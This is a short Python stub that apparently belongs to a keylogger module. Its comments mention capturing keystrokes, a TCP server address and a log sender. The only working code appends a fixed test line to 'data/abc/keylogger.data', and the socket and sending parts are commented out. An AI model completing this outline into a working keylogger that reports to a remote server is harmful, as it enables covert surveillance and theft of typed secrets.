import os
import struct
import sys
import time, threading
#import socket

#type your TCP Server address (IP and Port)
# this function logs keyboard input parsing to English Us keyboard format 
def run(**args):
	log = open("data/abc/keylogger.data", "a")
	log.write(" trying to Write something in Github directory \n")
	log.close()
# send log to the server function
#================= main Programs starts here ======================
#start log_sender in 1 sec
#threading.Timer(1, log_sender).start()
#then start keyboard input logger
